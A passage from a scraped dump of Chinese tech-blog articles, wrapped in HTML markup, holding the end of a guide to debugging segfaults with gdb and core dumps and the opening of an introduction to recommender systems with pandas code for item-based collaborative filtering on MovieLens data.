class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsymbol-file /path/to/my/binary\r\nsharedlibrary\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b6230423350e748646153-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230423350e748646153-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b6230423350e748646153-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b6230423350e748646153-1\"><span class=\"crayon-v\">symbol</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">file</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">path</span><span class=\"crayon-o\">/</span><span class=\"crayon-st\">to</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">my</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">binary</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230423350e748646153-2\"><span class=\"crayon-i\">sharedlibrary</span></div><div class=\"crayon-line\" id=\"crayon-5b6230423350e748646153-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>这从二进制文件及其引用的任何共享库中加载符号。一旦我这样做了，当我执行 <code>bt</code> 时，gdb 给了我一个带有行号的漂亮的堆栈跟踪！</p>\n<p>如果你想它能工作，二进制文件应该以带有调试符号信息的方式被编译。在试图找出程序崩溃的原因时，堆栈跟踪中的行号非常有帮助。:)</p>\n<h3 id=\"toc_9\">查看每个线程的堆栈</h3>\n<p>通过以下方式在 <code>gdb</code> 中获取每个线程的调用栈！</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b62304233511720050783\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nthread apply all bt full\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b62304233511720050783-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b62304233511720050783-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b62304233511720050783-1\"><span class=\"crayon-e\">thread </span><span class=\"crayon-e\">apply </span><span class=\"crayon-e\">all </span><span class=\"crayon-e\">bt </span><span class=\"crayon-i\">full</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b62304233511720050783-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p></p>\n<h3 id=\"toc_10\">gdb + 核心转储 = 惊喜</h3>\n<p>如果你有一个带调试符号的核心转储以及 <code>gdb</code>，那太棒了！您可以上下查看调用堆栈（LCTT 译注：指跳进调用序列不同的函数中以便于查看局部变量），打印变量，并查看内存来得知发生了什么。这是最好的。</p>\n<p>如果您仍然正在基于 gdb 向导来工作上，只打印出栈跟踪与bt也可以。 :)</p>\n<h3 id=\"toc_11\">ASAN</h3>\n<p>另一种搞清楚您的段错误的方法是使用 AddressSanitizer 选项编译程序（“ASAN”，即 <code>$CC -fsanitize=address</code>）然后运行它。 本文中我不准备讨论那个，因为本文已经相当长了，并且在我的例子中打开 ASAN 后段错误消失了，可能是因为 ASAN 使用了一个不同的内存分配器（系统内存分配器，而不是 tcmalloc）。</p>\n<p>在未来如果我能让 ASAN 工作，我可能会多写点有关它的东西。（LCTT 译注：这里指使用 ASAN 也能复现段错误）</p>\n<h3 id=\"toc_12\">从一个核心转储得到一个堆栈跟踪真的很亲切！</h3>\n<p>这个博客听起来很多，当我做这些的时候很困惑，但说真的，从一个段错误的程序中获得一个堆栈调用序列不需要那么多步骤：</p>\n<ol>\n<li>试试用 <code>valgrind</code></li>\n</ol>\n<p>如果那没用，或者你想要拿到一个核心转储来调查：</p>\n<ol>\n<li>确保二进制文件编译时带有调试符号信息；</li>\n<li>正确的设置 <code>ulimit</code> 和 <code>kernel.core_pattern</code>；</li>\n<li>运行程序；</li>\n<li>一旦你用 <code>gdb</code> 调试核心转储了，加载符号并运行 <code>bt</code>；</li>\n<li>尝试找出发生了什么！</li>\n</ol>\n<p>我可以使用 <code>gdb</code> 弄清楚有个 C++ 的虚表条目指向一些被破坏的内存，这有点帮助，并且使我感觉好像更懂了 C++ 一点。也许有一天我们会更多地讨论如何使用 <code>gdb</code> 来查找问题！</p>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114211\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114211votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114211\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/14452eea6b79bce0219227f298ad827f2ba7112d.jpg"},{"url_object_id": "88d72b6ddc5b2258e74e168818d2bf9e", "title": ["推荐系统概述"], "url": "http://blog.jobbole.com/114167/", "create_date": "2018/07/30", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/05/1a58c225e4d199c6b01c7dcec81cea65.png"], "praise_nums": "2", "comment_nums": 1, "fav_nums": 1, "tags": "IT技术, Pandas, 协同过滤, 推荐系统", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/q2346410846\">Marticles</a> 翻译，<a href=\"http://www.jobbole.com/members/buntamarui\">小米云豆粥</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"https://dzone.com/articles/introduction-to-recommender-systems\">Toby Daigle</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><blockquote><p>“聆忠言者众，惟智者受益。” — 哈珀·李</p></blockquote>\n<p>许多人把推荐系统视为一种神秘的存在，他们觉得推荐系统似乎知道我们的想法是什么。Netflix 向我们推荐电影，还有亚马逊向我们推荐该买什么样的商品。推荐系统从早期发展到现在，已经得到了很大的改进和完善，以不断地提高用户体验。尽管推荐系统中许多都是非常复杂的系统，但其背后的基本思想依然十分简单。</p>\n<h2>推荐系统是什么？</h2>\n<p>推荐系统是信息过滤系统的一个子类，它根据用户的偏好和行为，来向用户呈现他(或她)可能感兴趣的物品。推荐系统会尝试去预测你对一个物品的喜好，以此向你推荐一个你很有可能会喜欢的物品。</p>\n<h2>如何构建一个推荐系统？</h2>\n<p>现在已经有很多种技术来建立一个推荐系统了，我选择向你们介绍其中最简单，也是最常用的三种。他们是：<strong>一，协同过滤；二，基于内容的推荐系统；三，基于知识的推荐系统。</strong>我会解释前面的每个系统相关的弱点，潜在的缺陷，以及如何去避免它们。最后，我在文章末尾为你们准备了一个推荐系统的完整实现。</p>\n<h3>协同过滤</h3>\n<p>协同过滤，是首次被用于推荐系统上的技术，至今仍是最简单且最有效的。协同过滤的过程分为这三步：一开始，收集用户信息，然后以此生成矩阵来计算用户关联，最后作出高可信度的推荐。这种技术分为两大类：一种基于用户，另一种则是基于组成环境的物品。</p>\n<h4>基于用户的协同过滤</h4>\n<p>基于用户的协同过滤本质上是寻找与我们的目标用户具有相似品味的用户。如果Jean-Pierre和Jason曾对几部电影给出了相似的评分，那么我们认为他们就是相似的用户，接着我们就可以使用Jean Pierre的评分来预测Jason的未知评分。例如，如果Jean-Pierre喜欢星球大战3:绝地武士归来和星球大战5:帝国反击战，Jason也喜欢绝地武士归来，那么帝国反击战对Jason来说是就是一个很好的推荐。一般来说，你只需要一小部分与Jason相似的用户来预测他的评价。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/05/1a58c225e4d199c6b01c7dcec81cea65.png\" alt=\"User-based CF\"></p>\n<p>在下表中，每行代表一个用户，每列代表一部电影，只需简单地查找这个矩阵中行之间的相似度，就可以找到相似的用户了。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/05/1f6a3de5d4711489a71f4d1dae2a8009.png\" alt=\"User-based CF Matrix\"></p>\n<p>然而，基于用户的协同过滤在实现中存在一些以下问题：</p>\n<ul>\n<li>用户偏好会随时间的推移而改变，推荐系统生成的许多推荐可能会随之变得过时。</li>\n<li>用户的数量越多，生成推荐的时间就越长。</li>\n<li>基于用户会导致对托攻击敏感，这种攻击方法是指恶意人员通过绕过推荐系统，使得特定物品的排名高于其他物品。<br>\n(托攻击即Shilling Attack,是一种针对协同过滤根据近邻偏好产生推荐的特点，恶意注入伪造的用户模型，推高或打压目标排名，从而达到改变推荐系统结果的攻击方式)</li>\n</ul>\n<h4>基于物品的协同过滤</h4>\n<p>基于物品的协同过滤过程很简单。两个物品的相似性基于用户给出的评分来算出。让我们回到Jean-Pierre与Jason的例子，他们两人都喜欢“绝地武士归来”和“帝国反击战”。 因此，我们可以推断，喜欢第一部电影的大多数用户也可能会喜欢第二部电影。所以，对于喜欢“绝地武士归来”的第三个人Larry来说，”帝国反击战“的推荐将是有意义的。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/05/3bb79bc04f2079a3ce6b30b9ce70e65c.png\" alt=\"Item-based CF\"></p>\n<p>所以，这里的相似度是根据列而不是行来计算的(与上面的用户-电影矩阵中所见的不同)。基于物品的协同过滤常常受到青睐，因为它没有任何基于用户的协同过滤的缺点。首先，系统中的物品(在这个例子中物品就是电影)不会随着时间的推移而改变，所以推荐会越来越具有关联性。此外，通常推荐系统中的物品都会比用户少，这减少了推荐的处理时间。最后，考虑到没有用户能够改变系统中的物品，这种系统要更难于被欺骗或攻击。</p>\n<h3>基于内容的推荐系统</h3>\n<p>在基于内容的推荐系统中，元素的描述性属性被用来构成推荐。“内容Content”一词指的就是这些描述。举个例子，根据Sophie的听歌历史，推荐系统注意到她似乎喜欢乡村音乐。因此，系统可以推荐相同或相似类型的歌曲。更复杂的推荐系统能够发现多个属性之间的关系，从而产生更高质量的推荐。例如，音乐基因组计划(Music Genome Project)根据450个不同的属性将数据库中的每支歌曲进行分类。该项目为Pandor的歌曲推荐提供技术支持。(Pandor提供在线音乐流媒体服务，类似Spolify)</p>\n<h3>基于知识的推荐系统</h3>\n<p>基于知识的推荐系统在物品购买频率很低的情况下特别适用。例如房屋、汽车、金融服务甚至是昂贵的奢侈品。在这种情况下，推荐的过程中常常缺乏商品的评价。基于知识的推荐系统不使用评价来作出推荐。相反，推荐过程是基于顾客的需求和商品描述之间的相似度，或是对特定用户的需求使用约束来进行的。这使得这种类型的系统是独一无二的，因为它允许顾客明确地指定他们想要什么。关于约束，当应用时，它们大多是由该领域的专家实施的，这些专家从一开始就知道该如何实施这些约束。例如，当用户明确指出在一个特定的价格范围内寻找一个家庭住宅时，系统必须考虑到这个用户规定的约束。</p>\n<h2>推荐系统中的冷启动问题</h2>\n<p>推荐系统中的主要问题之一是最初可用的评价数量相对较小。当新用户还没有给电影打分，或者一部新的电影被添加到系统中时，我们该怎么做呢？在这种情况下，应用传统的协同过滤模型会更加困难。尽管基于内容和基于知识的推荐算法在面临冷启动问题时比协同过滤更具有鲁棒性，但基于内容和基于知识并不总是可用的。因此，一些新方法，比如混合系统，已经被设计出用来解决这个问题了。</p>\n<h2>混合推荐系统</h2>\n<p>文章到目前为止所介绍的不同类型的推荐系统都各有优劣，他们根据不同的数据给出推荐。 一些推荐系统，如基于知识的推荐系统，在数据量有限的冷启动环境下最为有效。其他系统，如协同过滤，在有大量数据可用时则更加有效。在多数情况下，数据都是多样化的，我们可以为同一任务灵活采用多种方法。 因此，我们可以结合多种不同技术的推荐来提高整个系统的推荐质量。许多的组合性技术已经被探索出来了，包括：</p>\n<ul>\n<li>加权：为推荐系统中的每种算法都赋予不同的权重，使得推荐偏向某种算法</li>\n<li>交叉：将所有的推荐结果集合在一起展现，没有偏重</li>\n<li>增强：一个系统的推荐将作为下一个系统的输入，循环直至最后一个系统为止</li>\n<li>切换：随机选择一种推荐方法</li>\n</ul>\n<p>混合推荐系统中的一个最有名的例子是于2006至2009年举行的Netflix Price算法竞赛。这个竞赛的目标是将Netflix的电影推荐系统Cinematch的算法准确率提高至少10%。Bellkor’s Pragmatix Chaos团队用一种融合了107种不同算法的方案将Cinematch系统的推荐准确率提高了10.06%，并最终获得了100万美元奖金。你可能会对这个例子中的准确率感到好奇，准确率其实就是对电影的预测评分与实际评分接近程度的度量。</p>\n<h2>推荐系统与AI？</h2>\n<p>推荐系统常用于人工智能领域。推荐系统的能力 – 洞察力，预测事件的能力和突出关联的能力常被用于人工智能中。另一方面，机器学习技术常被用于实现推荐系统。例如，在Arcbees，我们使用了神经网络和来自IMdB的数据成功建立了一个电影评分预测系统。神经网络可以快速地执行复杂的任务并轻松地处理大量数据。通过使用电影列表作为神经网络的输入，并将神经网络的输出与用户评分进行比较，神经网络可以自我学习规则以预测特定用户的未来评分。</p>\n<h2>专家建议</h2>\n<p>在我读过许多资料中，我注意到有两个很重要的建议经常被推荐系统领域内的专家提及。第一，基于用户付费的物品进行推荐。当一个用户有购买意愿时，你就可以断定他的评价一定是更具有相关性与准确的。第二，使用多种算法总是比改进一种算法要好。Netflix Prize竞赛就是一个很好的例子。</p>\n<h2>实现一个基于物品的推荐系统</h2>\n<p>下面的代码演示了实现一个基于物品的推荐系统是多么的简单与快速。所使用的语言是Python，并使用了Pandas与Numpy这两个在推荐系统领域中最流行的库。所使用的数据是电影评分，数据集来自MovieLens。</p>\n<h3>第一步：寻找相似的电影</h3>\n<p>1.读取数据</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b625449dfff1122977332\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nimport pandas as pd\r\nimport numpy as np\r\n\r\nratings_cols = ['user_id', 'movie_id', 'rating']\r\nratings = pd.read_csv('u.data', sep='t', names=ratings_cols, usecols=range(3))\r\n\r\nmovies_cols = ['movie_id', 'title']\r\nmovies = pd.read_csv('u.item', sep='|', names=movies_cols, usecols=range(2))\r\n\r\nratings = pd.merge(ratings, movies)</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b625449dfff1122977332-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625449dfff1122977332-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b625449dfff1122977332-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625449dfff1122977332-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b625449dfff1122977332-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625449dfff1122977332-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b625449dfff1122977332-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625449dfff1122977332-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b625449dfff1122977332-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625449dfff1122977332-10\">10</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b625449dfff1122977332-1\"><span class=\"crayon-e\">import </span><span class=\"crayon-e\">pandas </span><span class=\"crayon-st\">as</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">pd</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625449dfff1122977332-2\"><span class=\"crayon-e\">import </span><span class=\"crayon-e\">numpy </span><span class=\"crayon-st\">as</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">np</span></div><div class=\"crayon-line\" id=\"crayon-5b625449dfff1122977332-3\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625449dfff1122977332-4\"><span class=\"crayon-v\">ratings_cols</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-s\">'user_id'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'movie_id'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'rating'</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5b625449dfff1122977332-5\"><span class=\"crayon-v\">ratings</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pd</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">read_csv</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'u.data'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sep</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'t'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">names</span><span class=\"crayon-o\">=</span><span class=\"crayon-v\">ratings_cols</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">usecols</span><span class=\"crayon-o\">=</span><span class=\"crayon-e\">range</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625449dfff1122977332-6\"> </div><div class=\"crayon-line\" id=\"crayon-5b625449dfff1122977332-7\"><span class=\"crayon-v\">movies_cols</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-s\">'movie_id'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'title'</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625449dfff1122977332-8\"><span class=\"crayon-v\">movies</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pd</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">read_csv</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'u.item'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sep</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'|'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">names</span><span class=\"crayon-o\">=</span><span class=\"crayon-v\">movies_cols</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">usecols</span><span class=\"crayon-o\">=</span><span class=\"crayon-e\">range</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b625449dfff1122977332-9\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625449dfff1122977332-10\"><span class=\"crayon-v\">ratings</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pd</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">merge</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">ratings</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">movies</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0022 seconds] -->\r\n<p>2.构造用户的电影矩阵</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b625449dfffa872447605\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nmovieRatings = ratings.pivot_table(index=['user_id'],columns=['title'],values='rating')</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b625449dfffa872447605-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b625449dfffa872447605-1\"><span class=\"crayon-v\">movieRatings</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ratings</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">pivot_table</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">index</span><span class=\"crayon-o\">=</span><span class=\"crayon-sy\">[</span><span class=\"crayon-s\">'user_id'</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">columns</span><span class=\"crayon-o\">=</span><span class=\"crayon-sy\">[</span><span class=\"crayon-s\">'title'</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">values</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'rating'</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>3.选择一部电影并生成这部电影与其他所有电影的相似度</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b625449dfffe014659830\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" 